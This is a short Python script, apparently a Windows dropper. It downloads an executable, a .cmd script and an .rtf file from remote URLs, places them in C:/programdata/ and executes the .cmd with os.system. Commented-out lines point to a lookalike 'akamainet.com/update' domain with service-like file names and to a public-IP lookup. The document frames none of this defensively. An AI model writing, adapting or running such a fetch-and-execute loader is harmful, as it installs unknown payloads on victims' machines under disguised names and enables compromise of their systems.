from asyncore import socket_map
import socket
import sys
import urllib.request
import os
import http.client


# url1 = "https://akamainet.com/update/MonitoringCacheLog.cmd"
# url2 = "https://akamainet.com/update/MonitoringCache.exe"
# url3 = "https://akamainet.com/update/Service.SchCache.rtf"
url1 = "https://github.com/shamemask/Python/blob/main/junior/dist/trnsSrnCsh.exe"
url2 = "https://github.com/shamemask/Python/blob/main/junior/dist/2.cmd"
url3 = "https://github.com/shamemask/Python/blob/main/junior/dist/2.rtf"
url = []
url.append(url1)
url.append(url2)
url.append(url3)

path = os.path.abspath(os.path.dirname(sys.argv[0]))
print(f"path is {path}")

# conn = http.client.HTTPConnection("ifconfig.me")
# conn.request("GET", "/ip")
# print(conn.getresponse().read())
# print(socket.gethostbyname(socket.gethostname()))


cmd = ""

for ur in url:
    filename = ur.split('/')[-1]
    if filename.split('.')[-1] == 'cmd':
        cmd = "C:/programdata/"+filename
    print(f"filename is {filename}")
    urllib.request.urlretrieve(ur, filename)
    os.replace(filename, "C:/programdata/"+filename)


print(cmd)
os.system(cmd)
